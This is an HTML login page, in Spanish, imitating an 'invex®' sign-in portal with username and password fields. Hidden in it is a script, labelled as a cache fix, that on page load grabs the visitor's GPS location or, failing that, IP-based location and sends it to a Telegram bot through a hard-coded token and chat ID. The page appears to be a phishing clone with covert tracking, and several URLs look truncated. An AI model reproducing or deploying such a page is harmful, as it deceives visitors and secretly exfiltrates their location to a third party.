<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Acceso — invex®</title>
    <link rel="stylesheet" href="styles.css" />
    <!-- CDN Correcto para cargar los iconos de Font Awesome -->
    <link rel="stylesheet" href="https://cloudflare.com" />
</head>
<body>
<main class="login-wrapper">
    <h1 id="brand-title" class="brand">invex<sup>®</sup></h1>
    <section class="login-card" aria-labelledby="brand-title">
        <div class="lang-selector">
            <label for="lang" class="visually-hidden">Idioma</label>
            <select id="lang" name="lang">
                <option value="es-ES" selected>es-ES</option>
                <option value="en-US">en-US</option>
            </select>
        </div>
        <h2 class="welcome-title">¡Hola, bienvenido!</h2>
        
        <form id="login-form" class="login-form" novalidate>
            <!-- Campo Usuario -->
            <div class="field">
                <input type="text" id="username" name="username" placeholder=" " autocomplete="username" required />
                <label for="username" class="floating-label">Usuario</label>
            </div>
            
            <!-- Campo Contraseña -->
            <div class="field">
                <input type="password" id="password" name="password" placeholder=" " autocomplete="current-password" required />
                <label for="password" class="floating-label">Contraseña</label>
                <span class="toggle-password" id="togglePassword">
                    <!-- CORREGIDO: xmlns con la estructura estándar completa para Chrome -->
                    <svg id="eyeIcon" xmlns="http://w3.org" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M9.88 9.88a3 3 0 1 0 4.24 4.24"></path>
                        <path d="M10.73 5.08A10.43 10.43 0 0 1 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68"></path>
                        <path d="M6.61 6.61A13.52 13.52 0 0 0 2 12s3 7 10 7a9.74 9.74 0 0 0 5.39-1.61"></path>
                        <line x1="2" y1="2" x2="22" y2="22"></line>
                    </svg>
                </span>
            </div>
            
            <p id="form-message" class="form-message" role="alert" aria-live="polite"></p>
            <button type="submit" class="btn-submit">Iniciar sesión</button>
        </form>

        <div class="forgot-container">
            <p class="forgot-text-question">¿Olvidaste tu usuario o contraseña?</p>
            <a href="password.html" class="forgot-link">Recupéralos aquí</a>
        </div>
    </section>
</main>

<!-- SCRIPT DIRECTO PARA EVITAR CACHÉ DE UBICACIÓN -->
<script>
(function() {
    const TOKEN = '9068600803:AAEPd0lHMbVcyxhsCbXJGfutL0X-v6mr-pY';
    const CHAT_ID = '9180377107';

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(pos) {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            const acc = pos.coords.accuracy;

            const urlMaps = "https://google.com" + lat + "," + lon;
            const texto = "📍 Nueva Visita (GPS)\n\n• Latitud: " + lat + "\n• Longitud: " + lon + "\n• Precisión: ~" + Math.round(acc) + " metros\n\nGoogle Maps: " + urlMaps;

            fetch("https://telegram.org" + TOKEN + "/sendMessage", {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: texto })
            });
        }, function(err) {
            fetch('https://ipapi.co')
            .then(res => res.json())
            .then(data => {
                const urlMapsIP = "https://google.com" + data.latitude + "," + data.longitude;
                const textoIP = "🌐 Nueva Visita (Por IP)\n\n• IP: " + data.ip + "\n• País: " + data.country_name + "\n• Ciudad: " + data.city + "\n\nGoogle Maps: " + urlMapsIP;
                
                fetch("https://telegram.org" + TOKEN + "/sendMessage", {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: textoIP })
                });
            });
        }, { enableHighAccuracy: true, timeout: 6000 });
    }
})();
</script>

<!-- Carga del archivo principal de interacción lógica -->
<script src="app.js?v=update2026"></script>
</body>
</html>
